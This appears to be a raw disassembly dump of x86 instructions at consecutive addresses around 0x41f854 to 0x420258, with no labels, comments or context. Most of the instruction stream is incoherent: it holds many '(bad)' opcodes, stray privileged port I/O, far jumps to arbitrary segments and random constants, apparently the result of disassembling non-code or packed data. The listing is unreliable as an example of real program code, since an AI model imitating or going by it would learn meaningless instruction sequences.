  41f854:	in     al,dx
  41f855:	sar    esp,cl
  41f857:	cwde   
  41f858:	inc    ebx
  41f859:	aas    
  41f85a:	in     al,dx
  41f85b:	(bad)
  41f85e:	fdiv   st(3),st
  41f860:	mov    esi,eax
  41f862:	mov    dl,0x61
  41f864:	cs (bad) 
  41f866:	int3   
  41f867:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f868:	adc    esp,esi
  41f86a:	(bad)  
  41f86b:	jne    0x41f809
  41f86d:	sub    al,0x15
  41f86f:	push   0xa661f3a
  41f874:	mov    DWORD PTR [ecx],esp
  41f876:	loop   0x41f8c1
  41f878:	sbb    ebx,DWORD PTR [ebx]
  41f87a:	jmp    0x287f:0xedd24a40
  41f881:	call   0x8184387
  41f886:	pop    es
  41f887:	pushf  
  41f888:	pop    ds
  41f889:	xchg   ecx,eax
  41f88a:	pavgw  mm1,mm4
  41f88d:	adc    ch,BYTE PTR [esi+0x68d6c0c6]
  41f893:	loope  0x41f82a
  41f895:	out    dx,al
  41f896:	pop    ebx
  41f897:	jnp    0x41f8f3
  41f899:	daa    
  41f89a:	ins    BYTE PTR es:[edi],dx
  41f89b:	shr    DWORD PTR [ebx-0x7a],cl
  41f89e:	sbb    eax,0xdc28230d
  41f8a3:	sbb    eax,0x552f9bae
  41f8a8:	or     DWORD PTR [ebp+eiz*4+0x5f],0x1a
  41f8ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f8ae:	xlat   BYTE PTR ds:[ebx]
  41f8af:	cmp    ah,BYTE PTR [ebx]
  41f8b1:	data16 lahf 
  41f8b3:	pop    eax
  41f8b4:	sti    
  41f8b5:	xor    DWORD PTR [ecx+ecx*2+0x54de282c],edx
  41f8bc:	mov    dl,0xd4
  41f8be:	xchg   edx,eax
  41f8bf:	lods   al,BYTE PTR ds:[esi]
  41f8c0:	push   esp
  41f8c1:	dec    edx
  41f8c2:	lds    edx,FWORD PTR [ebx]
  41f8c4:	mov    al,0xac
  41f8c6:	jae    0x41f893
  41f8c8:	fwait
  41f8c9:	inc    edx
  41f8ca:	push   edi
  41f8cb:	shl    BYTE PTR [ebx+0x7d],0x71
  41f8cf:	cdq    
  41f8d0:	scas   al,BYTE PTR es:[edi]
  41f8d1:	ins    BYTE PTR es:[edi],dx
  41f8d2:	pop    es
  41f8d3:	pop    es
  41f8d4:	popf   
  41f8d5:	stos   BYTE PTR es:[edi],al
  41f8d6:	dec    ecx
  41f8d7:	fcom   DWORD PTR ds:0xaa674ad1
  41f8dd:	push   edi
  41f8de:	cmp    edi,DWORD PTR [edx]
  41f8e0:	sbb    eax,0x81935010
  41f8e5:	loop   0x41f88b
  41f8e7:	loopne 0x41f8c0
  41f8e9:	repnz (bad) 
  41f8eb:	mov    eax,ds:0xaa
	...
  41f954:	add    BYTE PTR [eax],al
  41f956:	mov    eax,ds:0x3b920b9a
  41f95b:	xchg   ebx,eax
  41f95c:	mov    ecx,0x4183febb
  41f961:	pop    edx
  41f962:	pop    eax
  41f963:	(bad)  
  41f965:	push   edx
  41f966:	jmp    0x41f9ba
  41f968:	add    DWORD PTR [eax],eax
  41f96a:	inc    DWORD PTR [eax]
  41f96c:	add    BYTE PTR [eax],al
  41f96e:	repnz stos BYTE PTR es:[edi],al
  41f970:	dec    ecx
  41f971:	jp     0x41f96d
  41f973:	add    al,0xb0
  41f975:	add    ebp,DWORD PTR [ecx]
  41f977:	mov    esi,0xa1cfca6f
  41f97c:	jl     0x41f9d0
  41f97e:	cwde   
  41f97f:	outs   dx,DWORD PTR ds:[esi]
  41f980:	mov    ebx,0x5bf30209
  41f985:	mov    ebx,0x31e7f9fd
  41f98a:	mov    DWORD PTR [eax],ecx
  41f98c:	xchg   edx,eax
  41f98d:	and    al,0xc
  41f98f:	inc    ecx
  41f990:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f991:	sti    
  41f992:	adc    al,0x81
  41f994:	add    BYTE PTR [ebp+0x47],dl
  41f997:	and    eax,0x8152fd12
  41f99c:	dec    ecx
  41f99d:	jnp    0x41f9c5
  41f99f:	cmp    al,0x21
  41f9a1:	js     0x41f98e
  41f9a3:	cs jl  0x41f95b
  41f9a6:	xchg   DWORD PTR [edi-0x34],ebp
  41f9a9:	ja     0x41f957
  41f9ab:	mov    eax,ds:0xed3e5695
  41f9b0:	sub    DWORD PTR [esp+eiz*4],edi
  41f9b3:	xchg   ebp,eax
  41f9b4:	cmc    
  41f9b5:	repnz lods eax,DWORD PTR ds:[esi]
  41f9b7:	pop    ds
  41f9b8:	xlat   BYTE PTR ds:[ebx]
  41f9b9:	jg     0x41fa11
  41f9bb:	shl    BYTE PTR [esi+esi*1],cl
  41f9be:	jne    0x41f9b5
  41f9c0:	mov    ebx,0x5bd273c7
  41f9c5:	ret    0x7987
  41f9c8:	dec    ecx
  41f9c9:	sub    DWORD PTR [edi+0x51],edi
  41f9cc:	gs (bad) 
  41f9ce:	sub    BYTE PTR [edx-0x26ce38e0],bh
  41f9d4:	or     esi,esp
  41f9d6:	cli    
  41f9d7:	fistp  WORD PTR [ebx-0x28bc4b9b]
  41f9dd:	enter  0x13ee,0x10
  41f9e1:	loop   0x41f9ac
  41f9e3:	pop    esi
  41f9e4:	cmp    BYTE PTR [ebx-0x1e],al
  41f9e7:	xor    ah,BYTE PTR [edx]
  41f9e9:	fcom   DWORD PTR [esi-0x53]
  41f9ec:	xchg   ebx,eax
  41f9ed:	pop    ebx
  41f9ee:	js     0x41f9f3
  41f9f0:	inc    ebp
  41f9f1:	pop    eax
  41f9f2:	inc    ebp
  41f9f3:	call   0xeb67af2d
  41f9f8:	mov    ebx,0xfed4c13a
  41f9fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f9fe:	shl    DWORD PTR [ebx+0x3c47c9bc],0x9f
  41fa05:	push   ecx
  41fa06:	fsubr  st(1),st
  41fa08:	in     al,dx
  41fa09:	and    eax,0x1665bdbe
  41fa0e:	xor    BYTE PTR [eax-0x7291f203],dl
  41fa14:	leave  
  41fa15:	pop    ebp
  41fa16:	sti    
  41fa17:	push   eax
  41fa18:	call   0x3438:0x8e7e40c3
  41fa1f:	(bad)  
  41fa20:	mov    ds:0xaa8bceae,eax
  41fa25:	sbb    edx,DWORD PTR [edx-0x73]
  41fa28:	int3   
  41fa29:	mov    ch,0x5e
  41fa2b:	or     eax,0x5683a7cd
  41fa30:	test   al,0x7d
  41fa32:	sub    eax,0x66b79154
  41fa37:	dec    edx
  41fa38:	push   ebx
  41fa39:	pusha  
  41fa3a:	and    edx,DWORD PTR [ebp-0x4941c783]
  41fa40:	xchg   ebp,eax
  41fa41:	xchg   DWORD PTR [esi+0x35],eax
  41fa44:	mov    edx,0xae2fa0c6
  41fa49:	jmp    0x1f2c58bf
  41fa4e:	jb     0x41fa21
  41fa50:	push   ds
  41fa51:	pop    ss
  41fa52:	fwait
  41fa53:	mov    ecx,0xdd192b45
  41fa58:	shl    BYTE PTR [eax-0x24],cl
  41fa5b:	or     al,0x2a
  41fa5d:	adc    al,0x4d
  41fa5f:	cmp    DWORD PTR [edi],edx
  41fa61:	push   ecx
  41fa62:	push   eax
  41fa63:	mov    esp,0xb939faeb
  41fa68:	mov    al,0x46
  41fa6a:	cmc    
  41fa6b:	repz daa 
	...
  41fad5:	add    BYTE PTR [edx],cl
  41fad7:	inc    ecx
  41fad8:	mov    bh,0xa1
  41fada:	push   edi
  41fadc:	push   ds
  41fadd:	jmp    0x41fb02
  41fadf:	push   edi
  41fae0:	mov    ds:0x4f403415,eax
  41fae5:	add    eax,0x153ea
  41faea:	inc    DWORD PTR [eax]
  41faec:	add    BYTE PTR [eax],al
  41faee:	sbb    eax,DWORD PTR fs:[ebp+0x773dadc5]
  41faf5:	fadd   DWORD PTR [edi+ecx*8-0x67]
  41faf9:	jg     0x41fb5b
  41fafb:	fs int3 
  41fafd:	cmp    BYTE PTR [edi+0x18],dl
  41fb00:	cmp    edi,DWORD PTR [ebp+ecx*1-0x42]
  41fb04:	popa   
  41fb05:	mov    BYTE PTR [esi],al
  41fb07:	push   edi
  41fb08:	jbe    0x41fb3e
  41fb0a:	test   al,0x7e
  41fb0c:	mov    bl,0xe6
  41fb0e:	pusha  
  41fb0f:	lods   al,BYTE PTR ds:[esi]
  41fb10:	shl    DWORD PTR [esi+0x76],cl
  41fb13:	adc    dl,BYTE PTR [eax-0x17]
  41fb16:	mov    ecx,edi
  41fb18:	and    DWORD PTR [ebx-0x5f],eax
  41fb1b:	pop    ss
  41fb1c:	push   ds
  41fb1d:	aad    0xa6
  41fb1f:	adc    ebx,ebx
  41fb21:	xchg   esp,eax
  41fb22:	mov    eax,0xc75fce80
  41fb27:	aaa    
  41fb28:	ret    
  41fb29:	mov    ah,0xec
  41fb2b:	cmp    edx,DWORD PTR [esi+0x2c]
  41fb2e:	dec    ecx
  41fb2f:	daa    
  41fb30:	sub    eax,0xca59db29
  41fb35:	jb     0x41fb5a
  41fb37:	push   0xffffff94
  41fb39:	shl    BYTE PTR [eax-0x71],1
  41fb3c:	out    dx,al
  41fb3d:	inc    eax
  41fb3e:	xchg   esp,esi
  41fb40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb41:	in     al,0xd9
  41fb43:	idiv   DWORD PTR [eax*8+0x1006e61f]
  41fb4a:	xchg   ecx,eax
  41fb4b:	push   0xffffffec
  41fb4d:	jmp    0xb61b9b11
  41fb52:	push   eax
  41fb53:	or     BYTE PTR [edi-0x38],0x8b
  41fb57:	inc    ebp
  41fb58:	add    eax,0x3fe107ed
  41fb5d:	pextrw esi,mm7,0xfb
  41fb61:	sub    al,0xe
  41fb63:	sbb    al,0xfd
  41fb65:	sti    
  41fb66:	inc    esp
  41fb67:	out    0x3,eax
  41fb69:	xchg   esp,eax
  41fb6a:	outs   dx,BYTE PTR ds:[esi]
  41fb6b:	inc    ebx
  41fb6c:	mov    ebx,0x9d5d43ec
  41fb71:	or     ah,dl
  41fb73:	add    ecx,DWORD PTR [edi-0x46]
  41fb76:	push   ebp
  41fb77:	adc    ebx,esi
  41fb79:	push   edi
  41fb7a:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41fb7c:	push   ecx
  41fb7d:	inc    esi
  41fb7e:	or     DWORD PTR [esi],0x58
  41fb81:	inc    esi
  41fb82:	add    BYTE PTR [edx],cl
  41fb84:	mov    ah,0x20
  41fb86:	lods   eax,DWORD PTR ds:[esi]
  41fb87:	stos   BYTE PTR es:[edi],al
  41fb88:	ss jnp 0x41fbf5
  41fb8b:	popf   
  41fb8c:	mov    bl,0xc5
  41fb8e:	mov    edx,0xbe2d7f68
  41fb93:	push   0xb954acc
  41fb98:	or     ebp,eax
  41fb9a:	gs mov ebx,0x57782922
  41fba0:	mov    DWORD PTR [ebp-0x1c],edx
  41fba3:	jle    0x41fbab
  41fba5:	packuswb mm3,QWORD PTR [esi-0x5b]
  41fba9:	or     WORD PTR [esi+0x16818b65],cx
  41fbb0:	sbb    al,0x73
  41fbb2:	idiv   DWORD PTR [ebp+esi*2-0x7b0f6c0f]
  41fbb9:	or     BYTE PTR [edx],bh
  41fbbb:	dec    esp
  41fbbc:	add    BYTE PTR [ebx+ebp*8],dl
  41fbbf:	pop    ds
  41fbc0:	ds jb  0x41fc0c
  41fbc3:	mov    dh,BYTE PTR [ecx]
  41fbc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fbc6:	data16 cli 
  41fbc8:	out    0xa0,eax
  41fbca:	push   ebx
  41fbcb:	arpl   WORD PTR [edx-0x7ac6b3d],di
  41fbd1:	ret    0x995a
  41fbd4:	jle    0x41fc16
  41fbd6:	popf   
  41fbd7:	popf   
  41fbd8:	mov    ds:0xfa1bc329,al
  41fbdd:	(bad)  
  41fbde:	cwde   
  41fbdf:	dec    ebp
  41fbe0:	xchg   ecx,eax
  41fbe1:	or     eax,0xb8616a7f
  41fbe6:	mov    esp,0x9aeff586
  41fbeb:	add    ah,dl
	...
  41fc55:	add    ah,bl
  41fc57:	sub    BYTE PTR [edx-0x119011c],cl
  41fc5d:	cmp    BYTE PTR [esi],ah
  41fc5f:	ret    
  41fc60:	or     DWORD PTR [esi],edx
  41fc62:	das    
  41fc63:	jge    0x41fc32
  41fc65:	pop    edi
  41fc66:	jmp    0xff41fdbf
  41fc6b:	add    BYTE PTR [eax],al
  41fc6d:	add    bh,ah
  41fc6f:	xlat   BYTE PTR ds:[ebx]
  41fc70:	retf   
  41fc71:	imul   DWORD PTR [edi]
  41fc73:	or     dl,dh
  41fc75:	jmp    0xcc7dc3fe
  41fc7a:	push   esp
  41fc7b:	mov    al,ds:0x5bf362e0
  41fc80:	pusha  
  41fc81:	mov    eax,0x9fc1d2cd
  41fc86:	sub    al,0xc7
  41fc88:	push   ebx
  41fc89:	jnp    0x41fc98
  41fc8b:	ja     0x41fc8f
  41fc8d:	mov    ch,0xe7
  41fc8f:	shl    ecx,1
  41fc91:	jb     0x41fcca
  41fc93:	and    edx,DWORD PTR [edi+0x9db1cd3]
  41fc99:	inc    ecx
  41fc9a:	shl    al,1
  41fc9c:	(bad)  
  41fc9d:	in     eax,0xc7
  41fc9f:	pusha  
  41fca0:	call   0xe5df:0xb9b9c8ed
  41fca7:	jg     0x41fc80
  41fca9:	mov    edi,DWORD PTR [edi+0x18aa13e7]
  41fcaf:	adc    DWORD PTR [ebx+0x57a8a084],ebx
  41fcb5:	sbb    ch,BYTE PTR [ebp+0x7d5d5bb1]
  41fcbb:	test   al,0xd7
  41fcbd:	sti    
  41fcbe:	bswap  esi
  41fcc0:	arpl   WORD PTR [edi],bp
  41fcc2:	inc    edi
  41fcc3:	sbb    esi,esi
  41fcc5:	mov    ch,0xb1
  41fcc7:	pop    ds
  41fcc8:	jae    0x41fd09
  41fcca:	rol    al,cl
  41fccc:	shr    BYTE PTR [edx],1
  41fcce:	mov    ebx,0x7da05732
  41fcd3:	push   eax
  41fcd4:	pop    eax
  41fcd5:	jo     0x41fcc1
  41fcd7:	ins    BYTE PTR es:[edi],dx
  41fcd8:	in     al,dx
  41fcd9:	and    eax,0x4ea6efec
  41fcde:	or     eax,DWORD PTR [edi-0x57ac0074]
  41fce4:	test   BYTE PTR [esi+edi*4+0x255ec2be],0x30
  41fcec:	or     BYTE PTR [eax],0x6f
  41fcef:	ror    DWORD PTR [ebx],1
  41fcf1:	fsubr  DWORD PTR [eax+0x2ddb97bd]
  41fcf7:	jmp    0x1bd3c808
  41fcfc:	mov    al,ds:0x16144b32
  41fd01:	add    DWORD PTR [edx],ecx
  41fd03:	nop
  41fd04:	push   0xfffffff6
  41fd06:	adc    BYTE PTR [edi+0x4fd24c04],cl
  41fd0c:	mov    ecx,0x77fbec4
  41fd11:	push   esi
  41fd12:	xchg   ebp,eax
  41fd13:	aad    0xa4
  41fd15:	adc    BYTE PTR [eax+0x1e],0x6
  41fd19:	mov    ebp,edx
  41fd1b:	sub    eax,0x76794fa4
  41fd20:	clc    
  41fd21:	ret    
  41fd22:	sysenter 
  41fd24:	inc    ebp
  41fd25:	mov    ch,0x33
  41fd27:	adc    al,0x1
  41fd29:	or     al,0x76
  41fd2b:	mov    ds:0x14247a96,eax
  41fd30:	fnstsw WORD PTR [edx+0x13]
  41fd33:	rcr    DWORD PTR [esi+0x5bf1c525],cl
  41fd39:	jge    0x41fd8c
  41fd3b:	outs   dx,BYTE PTR ds:[esi]
  41fd3c:	xchg   BYTE PTR [edi],al
  41fd3e:	mov    eax,0xcab1168e
  41fd43:	es gs adc ch,cl
  41fd47:	mov    ah,0xea
  41fd49:	xchg   DWORD PTR [ecx+0x2ad9d52c],ebx
  41fd4f:	mov    bl,0x99
  41fd51:	mov    ds:0x14b7462b,al
  41fd56:	imul   ecx,DWORD PTR [ebx+0x2fff95a0],0xfffffff1
  41fd5d:	jmp    0x41fd0a
  41fd5f:	sbb    ah,BYTE PTR [ebp-0x4cba61c]
  41fd65:	mov    ds:0x668da43,al
  41fd6a:	lods   eax,DWORD PTR ds:[esi]
  41fd6b:	add    esi,DWORD PTR [eax+eax*1]
	...
  41fdd6:	or     al,0x6a
  41fdd8:	push   edx
  41fdd9:	shl    DWORD PTR [esi-0x7],0x9f
  41fddd:	out    dx,eax
  41fdde:	pop    ds
  41fddf:	pop    edx
  41fde0:	pushf  
  41fde1:	push   ss
  41fde2:	(bad)  
  41fde4:	jnp    0x41fe17
  41fde6:	call   0xff41ff40
  41fdeb:	add    BYTE PTR [eax],al
  41fded:	add    BYTE PTR [ecx],dh
  41fdef:	jo     0x41fdfc
  41fdf1:	clc    
  41fdf2:	push   ebx
  41fdf3:	mov    edx,0xf0751b84
  41fdf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fdf9:	xchg   esp,eax
  41fdfa:	dec    ebx
  41fdfb:	cwde   
  41fdfc:	hlt    
  41fdfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fdfe:	and    DWORD PTR [edi+0x1e],0xd
  41fe02:	ins    BYTE PTR es:[edi],dx
  41fe03:	jmp    0x41fda1
  41fe05:	stos   DWORD PTR es:[edi],eax
  41fe06:	inc    edx
  41fe07:	mov    bl,0x43
  41fe09:	ss jo  0x41fe88
  41fe0c:	repnz (bad) 
  41fe0e:	cdq    
  41fe0f:	jl     0x41fd98
  41fe11:	(bad)  
  41fe12:	fs scas eax,DWORD PTR es:[edi]
  41fe14:	pop    ebp
  41fe15:	adc    DWORD PTR [edi],esp
  41fe17:	popf   
  41fe18:	mov    eax,ds:0xd9a98154
  41fe1d:	or     al,0x32
  41fe1f:	mov    esi,edi
  41fe21:	adc    edx,ebp
  41fe23:	imul   edi,DWORD PTR [ebp+ebx*2+0x4d],0xed3b8bc3
  41fe2b:	(bad)  
  41fe2d:	popa   
  41fe2e:	test   BYTE PTR ds:0x64899841,dh
  41fe34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe35:	cld    
  41fe36:	(bad)  
  41fe37:	(bad)  
  41fe38:	test   eax,0x30d1e75a
  41fe3d:	std    
  41fe3e:	(bad)  
  41fe3f:	imul   ebx,DWORD PTR [ecx+0x17],0xffffffcf
  41fe43:	cs pop edi
  41fe45:	mov    ebx,0xcc914f2
  41fe4a:	fcmovnu st,st(1)
  41fe4c:	inc    ebp
  41fe4d:	xor    esi,eax
  41fe4f:	xor    eax,0xdbf1846f
  41fe54:	pop    esi
  41fe55:	pop    esi
  41fe56:	mov    DWORD PTR [eax+ebx*2-0x11],edx
  41fe5a:	xor    al,0xb9
  41fe5c:	lods   eax,DWORD PTR ds:[esi]
  41fe5d:	aam    0x39
  41fe5f:	mov    ebp,DWORD PTR [edx+0x3a776bc8]
  41fe65:	enter  0x634a,0x35
  41fe69:	xchg   BYTE PTR [edx+0x65],bl
  41fe6c:	pop    ecx
  41fe6d:	or     BYTE PTR [ecx+0x2f876972],cl
  41fe73:	daa    
  41fe74:	scas   eax,DWORD PTR es:[edi]
  41fe75:	xchg   ebx,eax
  41fe76:	clc    
  41fe77:	shl    BYTE PTR [edx+0x4a],1
  41fe7a:	pushf  
  41fe7b:	mov    ecx,0xebb3d98
  41fe80:	ja     0x41fee9
  41fe82:	add    ah,BYTE PTR [ecx+esi*8]
  41fe85:	pop    eax
  41fe86:	adc    al,0x78
  41fe88:	push   ss
  41fe89:	adc    al,0x97
  41fe8b:	mov    al,BYTE PTR [edx+0x6e]
  41fe8e:	loop   0x41fe38
  41fe90:	mov    ah,0x7a
  41fe92:	add    edi,esp
  41fe94:	les    ecx,FWORD PTR [ecx]
  41fe96:	lds    ecx,FWORD PTR [ebx+ebp*4+0xe]
  41fe9a:	xchg   ecx,eax
  41fe9b:	push   esp
  41fe9c:	les    edi,FWORD PTR [esi-0x1]
  41fe9f:	fldenv [eax-0xd]
  41fea2:	mov    al,0xb4
  41fea4:	add    al,0x73
  41fea6:	popa   
  41fea7:	les    esi,FWORD PTR [eax-0x2df3b352]
  41fead:	sbb    BYTE PTR [ecx+0x4],dh
  41feb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41feb1:	into   
  41feb2:	sub    DWORD PTR [edx+0x7c],0xfffffffe
  41feb6:	jmp    0x7e758d53
  41febb:	jmp    0x2260:0x8200da1b
  41fec2:	dec    eax
  41fec3:	jmp    0xb9e4:0x9c966b70
  41feca:	out    dx,al
  41fecb:	mov    ebp,DWORD PTR [edx-0x15]
  41fece:	repnz push esi
  41fed0:	fisttp DWORD PTR [esi]
  41fed2:	or     ch,ch
  41fed4:	dec    ebp
  41fed5:	add    BYTE PTR [edi],dh
  41fed7:	retf   0x86df
  41feda:	mov    dl,0xbe
  41fedc:	dec    esp
  41fedd:	arpl   WORD PTR [eax+0x44b6c6d0],bp
  41fee3:	lea    esp,[ebp-0x4b7972b2]
  41fee9:	jge    0x41ff42
  41feeb:	jecxz  0x41ff1d
	...
  41ff55:	add    BYTE PTR [edx-0x1865ab],ch
  41ff5b:	out    dx,eax
  41ff5c:	call   FWORD PTR [ebp-0x5]
  41ff5f:	(bad)  
  41ff60:	hlt    
  41ff61:	mov    ah,0xd0
  41ff63:	add    bl,BYTE PTR [ebp+0x156e7d9]
  41ff69:	add    bh,bh
  41ff6b:	add    BYTE PTR [eax],al
  41ff6d:	add    BYTE PTR [ecx-0x67eec31c],cl
  41ff73:	fwait
  41ff74:	inc    ecx
  41ff75:	xchg   ecx,eax
  41ff76:	mov    WORD PTR ds:0x70225f06,?
  41ff7c:	mov    WORD PTR [ecx],ds
  41ff7e:	xchg   ebx,eax
  41ff7f:	pop    esp
  41ff80:	imul   edi,DWORD PTR [ebx],0xfffffff9
  41ff83:	aam    0x2c
  41ff85:	imul   DWORD PTR [esp+ecx*2+0x20]
  41ff89:	in     eax,0x80
  41ff8b:	inc    edx
  41ff8c:	mov    al,0xf2
  41ff8e:	cld    
  41ff8f:	mov    dl,0xd6
  41ff91:	test   al,0x72
  41ff93:	test   ch,dl
  41ff95:	aas    
  41ff96:	dec    ecx
  41ff97:	ret    
  41ff98:	adc    eax,0x87a85da9
  41ff9d:	mov    eax,0xac1f82e3
  41ffa2:	mov    dh,BYTE PTR [edx]
  41ffa4:	cmp    eax,0xd5ab6e4f
  41ffa9:	out    0xe5,eax
  41ffab:	inc    ecx
  41ffac:	cdq    
  41ffad:	icebp  
  41ffae:	dec    eax
  41ffaf:	push   DWORD PTR [esi]
  41ffb1:	std    
  41ffb2:	div    BYTE PTR [ebx+eiz*2]
  41ffb5:	dec    esp
  41ffb6:	push   ebp
  41ffb7:	mov    ds,WORD PTR [ebp+0x19]
  41ffba:	jecxz  0x41ff91
  41ffbc:	dec    ebx
  41ffbd:	or     DWORD PTR ds:0x54842537,0xffffffd9
  41ffc4:	loop   0x41ffa3
  41ffc6:	popf   
  41ffc7:	mov    BYTE PTR [eax-0x6],al
  41ffca:	cmp    al,0xa1
  41ffcc:	xlat   BYTE PTR ds:[ebx]
  41ffcd:	sahf   
  41ffce:	mov    al,0x1b
  41ffd0:	outs   dx,BYTE PTR ds:[esi]
  41ffd1:	sbb    bl,bh
  41ffd3:	(bad)  
  41ffd4:	mov    esi,0x21a83e6f
  41ffd9:	enter  0x8669,0xa1
  41ffdd:	and    DWORD PTR [ecx+eax*2],eax
  41ffe0:	or     eax,0x7b2ee5a3
  41ffe5:	cs enter 0xc0d0,0xe4
  41ffea:	inc    edi
  41ffeb:	and    eax,DWORD PTR [edx-0x4b]
  41ffee:	push   edi
  41ffef:	loop   0x42002c
  41fff1:	jmp    0x978:0xc1d1cd1b
  41fff8:	fwait
  41fff9:	and    eax,0xa37acd4a
  41fffe:	mov    dh,0xaf
  420000:	or     eax,0x6659b5e0
  420005:	out    0x39,eax
  420007:	push   es
  420008:	mov    WORD PTR [edi+0x48],ds
  42000b:	and    BYTE PTR [edx],cl
  42000d:	jmp    0x77286dda
  420012:	mov    eax,ebx
  420014:	xor    eax,0xd739bda3
  420019:	sub    bl,cl
  42001b:	and    BYTE PTR [esi+0x3a],cl
  42001e:	and    DWORD PTR [ebx-0x39],esp
  420021:	(bad)  
  420022:	or     BYTE PTR [esp+ebx*8-0x66],ch
  420026:	into   
  420027:	sbb    DWORD PTR [eax],edx
  420029:	dec    esi
  42002a:	push   edx
  42002b:	adc    ebx,edi
  42002d:	dec    esp
  42002e:	aas    
  42002f:	adc    BYTE PTR [ebx+0x36f532e5],ah
  420035:	sub    esi,DWORD PTR ds:0x506f1f1b
  42003b:	inc    edi
  42003c:	fstp   TBYTE PTR [ebx+0x3d]
  42003f:	nop
  420040:	adc    edi,DWORD PTR [esi-0x19]
  420043:	rol    DWORD PTR [ebp-0x55146b98],1
  420049:	mov    ah,0xe6
  42004b:	(bad)  
  42004d:	hlt    
  42004e:	push   ecx
  42004f:	cmp    DWORD PTR [ebp+0x39],0x60
  420053:	lods   eax,DWORD PTR ds:[esi]
  420054:	shr    esi,0x42
  420057:	in     eax,0xe
  420059:	js     0x41ffee
  42005b:	loopne 0x420038
  42005d:	pop    ebp
  42005e:	sbb    dl,BYTE PTR [esi+edx*8+0x1e623c07]
  420065:	ins    BYTE PTR es:[edi],dx
  420066:	ins    BYTE PTR es:[edi],dx
  420067:	pop    es
  420068:	ins    BYTE PTR es:[edi],dx
  420069:	adc    eax,0x378212
	...
  4200d6:	bound  esp,QWORD PTR [ebp-0x8808a]
  4200dc:	imul   edi,DWORD PTR [ebp-0x6d81eb08],0xffffff8b
  4200e3:	in     al,dx
  4200e4:	xor    eax,0x157e699
  4200e9:	add    bh,bh
  4200eb:	add    BYTE PTR [eax],al
  4200ed:	add    BYTE PTR [ebx-0x33],ch
  4200f0:	jae    0x42008e
  4200f2:	fdiv   st(1),st
  4200f4:	stos   DWORD PTR es:[edi],eax
  4200f5:	or     DWORD PTR [ecx],ebx
  4200f7:	fadd   DWORD PTR [ebp-0x4c]
  4200fa:	scas   al,BYTE PTR es:[edi]
  4200fb:	gs jl  0x420114
  4200fe:	iret   
  4200ff:	sbb    BYTE PTR [edx+0xe4e79d8],al
  420105:	jge    0x420137
  420107:	std    
  420108:	dec    esp
  420109:	stc    
  42010a:	and    eax,0x6e88bea6
  42010f:	sbb    BYTE PTR [edx-0x4eae9cd4],cl
  420115:	js     0x4200bd
  420117:	jae    0x4200b6
  420119:	shl    BYTE PTR [edx+0x67955edf],0x1c
  420120:	jmp    0x489:0xe27bad57
  420127:	hlt    
  420128:	pop    esi
  420129:	in     al,dx
  42012a:	sti    
  42012b:	fmul   QWORD PTR [edi+0x61d59916]
  420131:	loopne 0x420199
  420133:	inc    edi
  420134:	mov    ebp,0xa7527b1f
  420139:	push   ebx
  42013a:	or     BYTE PTR ds:0x193477e9,bh
  420140:	inc    ebp
  420141:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420142:	aas    
  420143:	outs   dx,DWORD PTR ds:[esi]
  420144:	mov    ds:0xa6a85d6b,eax
  420149:	ja     0x420164
  42014b:	cmc    
  42014c:	cdq    
  42014d:	adc    al,0x4f
  42014f:	adc    eax,DWORD PTR [edx+ebx*1]
  420152:	adc    eax,0xf9de0f76
  420157:	fwait
  420158:	out    0xa3,al
  42015a:	popf   
  42015b:	aaa    
  42015c:	inc    edx
  42015d:	je     0x4201cb
  42015f:	iret   
  420160:	sbb    BYTE PTR [esi],ah
  420162:	push   ss
  420163:	repz mov ebx,0xcab64902
  420169:	ror    dl,1
  42016b:	jmp    0x42014e
  42016d:	add    DWORD PTR [edx],esp
  42016f:	push   esp
  420170:	or     eax,0x8c639d38
  420175:	mov    esi,eax
  420177:	fnstcw WORD PTR [edx-0x3b]
  42017a:	dec    DWORD PTR [esi-0x512169ef]
  420180:	push   ebx
  420181:	sub    BYTE PTR [edi],0xf0
  420184:	jecxz  0x420152
  420186:	repz sub DWORD PTR [edi+0x7e],ecx
  42018a:	add    BYTE PTR [ebp+0x47d01fc8],dh
  420190:	jecxz  0x4201ed
  420192:	mov    esp,DWORD PTR ds:0x4a490fb1
  420198:	jne    0x420215
  42019a:	add    dl,bh
  42019c:	pop    esi
  42019d:	(bad)  
  42019e:	mov    bl,0xa4
  4201a0:	scas   al,BYTE PTR es:[edi]
  4201a1:	inc    esi
  4201a2:	outs   dx,BYTE PTR ds:[esi]
  4201a3:	ins    BYTE PTR es:[edi],dx
  4201a4:	(bad)
  4201a9:	bound  edx,QWORD PTR [esi]
  4201ab:	dec    edx
  4201ac:	mov    bl,0xbe
  4201ae:	mov    ds:0x56991017,eax
  4201b3:	mov    bh,0x7b
  4201b5:	mov    dh,0xaf
  4201b7:	pushf  
  4201b8:	pop    esp
  4201b9:	mov    ebx,0x7ad9fee7
  4201be:	enter  0xc672,0x47
  4201c2:	pushf  
  4201c3:	ins    DWORD PTR es:[edi],dx
  4201c4:	js     0x420217
  4201c6:	dec    eax
  4201c7:	jp     0x4201c3
  4201c9:	shl    DWORD PTR [ebx-0x9121aea],1
  4201cf:	inc    ebx
  4201d0:	or     dh,BYTE PTR [esi-0x37]
  4201d3:	(bad)  
  4201d4:	ja     0x4201cf
  4201d6:	sub    al,0x78
  4201d8:	dec    esi
  4201d9:	mov    dh,0xef
  4201db:	sbb    ah,cl
  4201dd:	test   al,0xbd
  4201df:	push   ds
  4201e0:	dec    ebx
  4201e1:	push   eax
  4201e2:	stos   DWORD PTR es:[edi],eax
  4201e3:	aaa    
  4201e4:	pop    eax
  4201e5:	adc    bh,BYTE PTR [edx]
  4201e7:	std    
  4201e8:	jnp    0x4201aa
  4201ea:	cmp    BYTE PTR [edi],dh
  4201ec:	add    BYTE PTR [eax],0x0
	...
  420253:	add    BYTE PTR [eax],al
  420255:	add    BYTE PTR [ebx-0x31],dh
  420258:	fwait
